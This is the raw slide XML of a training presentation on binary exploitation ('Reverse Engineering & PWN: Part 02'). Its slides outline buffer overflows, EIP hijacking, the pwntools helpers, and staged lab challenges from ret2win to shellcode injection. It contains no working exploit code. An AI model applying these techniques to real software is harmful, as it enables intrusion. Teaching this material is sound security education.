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9.svg" ContentType="image/svg+xml"/>
  <Override PartName="/ppt/media/image21.svg" ContentType="image/svg+xml"/>
  <Override PartName="/ppt/media/image2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90" r:id="rId3"/>
    <p:sldId id="257" r:id="rId5"/>
    <p:sldId id="258" r:id="rId6"/>
    <p:sldId id="259" r:id="rId7"/>
    <p:sldId id="293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91" r:id="rId38"/>
    <p:sldId id="292" r:id="rId3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0.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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5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jpeg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1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2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3.jpe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54.jpe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image" Target="../media/image52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088" y="362545"/>
            <a:ext cx="958850" cy="1225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Invstigations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71475" y="1478756"/>
            <a:ext cx="5183505" cy="8820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altLang="en-GB" sz="3500" dirty="0"/>
              <a:t>Reverse Engineering &amp; PWN:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="3500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="82000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-GB" sz="3500" dirty="0"/>
              <a:t>Part 02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="3500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="371475" y="2405407"/>
            <a:ext cx="4643438" cy="4419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altLang="en-GB" sz="1500" dirty="0"/>
              <a:t>Dynamic Analysis (GDB), Debugging, Buffer Overflow, Exploit Development</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="371475" y="3967507"/>
            <a:ext cx="4643438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Presenter: Md. Tanjim Mahmud Tuhin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15025" y="2887414"/>
            <a:ext cx="2643188" cy="1321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INVESTIGATIONS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0" y="4929188"/>
            <a:ext cx="914400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Hiddeninvestigations.Net</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="386715" y="32956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6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="560070" y="373380"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="47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  <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="28" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="6576695" y="1080135"/>
            <a:ext cx="2376805" cy="2390140"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="2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30" name="Group 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="5243830" y="2767330"/>
            <a:ext cx="1856105" cy="1893570"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1066226" cy="1081304"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="31" name="Freeform 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="1066226" cy="1081304"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="1066226" h="1081304">
                  <a:moveTo>
                    <a:pt x="65021" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1001206" y="0"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="1037116" y="0"/>
                    <a:pt x="1066226" y="29111"/>
                    <a:pt x="1066226" y="65021"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="1066226" y="1016284"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="1066226" y="1052194"/>
                    <a:pt x="1037116" y="1081304"/>
                    <a:pt x="1001206" y="1081304"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="65021" y="1081304"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="29111" y="1081304"/>
                    <a:pt x="0" y="1052194"/>
                    <a:pt x="0" y="1016284"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="65021"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="0" y="29111"/>
                    <a:pt x="29111" y="0"/>
                    <a:pt x="65021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32" name="TextBox 12"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="-9525"/>
              <a:ext cx="1066226" cy="10908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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Freeform 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6782435" y="2914650"/>
            <a:ext cx="118745" cy="119380"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="258036" h="258036">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="258036" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258036" y="258036"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2580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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4953000" y="2365375"/>
            <a:ext cx="1539875" cy="1670685"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3356866" h="3622517">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3356866" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3356866" y="3622517"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3622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6" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5243830" y="4017645"/>
            <a:ext cx="1602105" cy="26543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r">
              <a:lnSpc>
                <a:spcPts val="2260"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Presented to</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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7" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4495800" y="4271010"/>
            <a:ext cx="2395855" cy="3105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r">
              <a:lnSpc>
                <a:spcPts val="2805"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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EWUCSC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="368935" y="4132607"/>
            <a:ext cx="4643438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Date: 10/08/2026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6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" y="714375"/>
            <a:ext cx="8001000" cy="4107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Last time we read binaries. Today we break them.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571500" y="1339453"/>
            <a:ext cx="3857625" cy="3146822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94" y="1553766"/>
            <a:ext cx="142875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4406" y="1518047"/>
            <a:ext cx="2175272" cy="2143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Part 1 Recap: Reading Binaries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94" y="1946672"/>
            <a:ext cx="71438" cy="114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7256" y="1918097"/>
            <a:ext cx="3307556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ELF Structure:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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Analyzing headers, symbols, and sections.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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94" y="2203847"/>
            <a:ext cx="71438" cy="1143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07256" y="2175272"/>
            <a:ext cx="3211116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Strings:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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Extracting hardcoded text and secret markers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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94" y="2461022"/>
            <a:ext cx="71438" cy="1143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07256" y="2432447"/>
            <a:ext cx="3007519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ltrace:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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Tracking library calls in real-time execution.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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94" y="2718197"/>
            <a:ext cx="71438" cy="1143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07256" y="2689622"/>
            <a:ext cx="3336131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Disassembly:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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Reading assembly instructions line by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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line.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4714875" y="1339453"/>
            <a:ext cx="3857625" cy="3146822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469" y="1553766"/>
            <a:ext cx="107156" cy="14287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072063" y="1518047"/>
            <a:ext cx="2075259" cy="2143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Today: Dynamic Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4893469" y="1918097"/>
            <a:ext cx="3500438" cy="335756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1" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5007769" y="2003822"/>
            <a:ext cx="1307306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1. Understand the Stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7429500" y="2003822"/>
            <a:ext cx="850106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2C2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Memory layout</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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5467" y="2357438"/>
            <a:ext cx="96441" cy="128588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4893469" y="2593181"/>
            <a:ext cx="3500438" cy="335756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5" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5007769" y="2678906"/>
            <a:ext cx="975122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2. Overflow Buffer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7554516" y="2678906"/>
            <a:ext cx="725091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2C2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Exceed limits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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5467" y="3032522"/>
            <a:ext cx="96441" cy="128588"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4893469" y="3268266"/>
            <a:ext cx="3500438" cy="335756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9" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5007769" y="3353991"/>
            <a:ext cx="639366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3. Hijack EIP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7290197" y="3353991"/>
            <a:ext cx="989409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2C2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Control execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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5467" y="3707606"/>
            <a:ext cx="96441" cy="128588"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4893469" y="3943350"/>
            <a:ext cx="3500438" cy="335756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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5007769" y="4029075"/>
            <a:ext cx="1489472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4. Automate with Pwntools</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7511653" y="4029075"/>
            <a:ext cx="767953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2C2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Python power</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="4700588"/>
            <a:ext cx="1382316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36" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8347472" y="4643438"/>
            <a:ext cx="225028" cy="2786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02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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" y="714375"/>
            <a:ext cx="8001000" cy="4107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exploit developer's toolkit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71500" y="1303734"/>
            <a:ext cx="8001000" cy="364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Pwntools is a Python library that makes writing exploits fast — packing addresses, talking over network sockets, and generating patterns.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71500" y="1984177"/>
            <a:ext cx="3929063" cy="953691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160984"/>
            <a:ext cx="128588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127052"/>
            <a:ext cx="525066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cyclic()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671888" y="2127052"/>
            <a:ext cx="685800" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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71888" y="2127052"/>
            <a:ext cx="685800" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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FIND OFFSET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="714375" y="2466380"/>
            <a:ext cx="3643313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Generates unique repeating byte patterns to instantly locate the exact offset where input crashes into the return pointer (EIP).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4643438" y="1984177"/>
            <a:ext cx="3929063" cy="953691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2175272"/>
            <a:ext cx="128588" cy="1285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86338" y="2141339"/>
            <a:ext cx="364331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p32()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7622381" y="2141339"/>
            <a:ext cx="807244" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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622381" y="2141339"/>
            <a:ext cx="807244" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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PACK ADDRESS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4786313" y="2480667"/>
            <a:ext cx="3643313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Converts integer memory addresses into raw 32-bit little-endian byte strings suitable for binary input injection.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571500" y="3066455"/>
            <a:ext cx="3929063" cy="110370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243263"/>
            <a:ext cx="160734" cy="1285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46547" y="3209330"/>
            <a:ext cx="1382316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remote() / process()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489722" y="3209330"/>
            <a:ext cx="867966" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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489722" y="3209330"/>
            <a:ext cx="867966" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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TALK TO TARGET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="714375" y="3548658"/>
            <a:ext cx="3643313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Manages input/output streams effortlessly, whether spawning local binary processes or interacting with remote TCP servers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4643438" y="3066455"/>
            <a:ext cx="3929063" cy="110370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3332559"/>
            <a:ext cx="146447" cy="1285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04197" y="3298627"/>
            <a:ext cx="767953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shellcraft()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7529513" y="3298627"/>
            <a:ext cx="900113" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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7529513" y="3298627"/>
            <a:ext cx="900113" cy="196453"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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MAKE SHELLCODE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4786313" y="3637955"/>
            <a:ext cx="3643313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Assembles optimized architecture-specific shellcode payloads and system command wrappers without manual machine coding.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="4636294"/>
            <a:ext cx="1382316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32" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8340328" y="4579144"/>
            <a:ext cx="232172" cy="2786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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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" y="714375"/>
            <a:ext cx="8001000" cy="4107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Four locks, each harder than the last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571500" y="1696920"/>
            <a:ext cx="1914525" cy="1449288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811220"/>
            <a:ext cx="592931" cy="207169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8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1811220"/>
            <a:ext cx="592931" cy="207169"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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2C2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STAGE 01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685800" y="2104113"/>
            <a:ext cx="1685925" cy="253603"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="51054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checksec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800" y="2443442"/>
            <a:ext cx="1685925" cy="4199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Observe and map active binary defenses and security shields before attacking.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2600325" y="1696920"/>
            <a:ext cx="1914525" cy="1449288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14625" y="1811220"/>
            <a:ext cx="610791" cy="207169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3" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2714625" y="1811220"/>
            <a:ext cx="610791" cy="207169"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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2C2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STAGE 02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2714625" y="2104113"/>
            <a:ext cx="1685925" cy="253603"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="51054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cyclic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714625" y="2443442"/>
            <a:ext cx="1685925" cy="4199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Ret2win exploitation — jumping execution to a hidden function via offset calculation.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4629150" y="1696920"/>
            <a:ext cx="1914525" cy="1449288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43450" y="1811220"/>
            <a:ext cx="614363" cy="207169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8" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4743450" y="1811220"/>
            <a:ext cx="614363" cy="207169"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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2C2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STAGE 03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743450" y="2104113"/>
            <a:ext cx="1685925" cy="253603"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="51054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networking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43450" y="2443442"/>
            <a:ext cx="1685925" cy="4199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Variable overwrite — manipulating adjacent memory structures over TCP sockets.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6657975" y="1696920"/>
            <a:ext cx="1914525" cy="1449288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772275" y="1820763"/>
            <a:ext cx="617934" cy="207169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3" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6772275" y="1820763"/>
            <a:ext cx="617934" cy="207169"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090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2C2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STAGE 04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772275" y="2113657"/>
            <a:ext cx="1685925" cy="253603"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="51054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shellcraft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772275" y="2452985"/>
            <a:ext cx="1685925" cy="5598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Shellcode injection — writing and executing custom instructions directly on the stack.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571500" y="3601343"/>
            <a:ext cx="8001000" cy="425053"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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1500" y="3601343"/>
            <a:ext cx="8001000" cy="425053"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="170053" tIns="119126" rIns="170053" bIns="119126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“Same bug, four levels of power.”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71500" y="4636182"/>
            <a:ext cx="1382316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8326041" y="4579032"/>
            <a:ext cx="246459" cy="2786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04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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514350" y="319831"/>
            <a:ext cx="648008" cy="194519"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="341337" cy="1024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1337" cy="102463"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
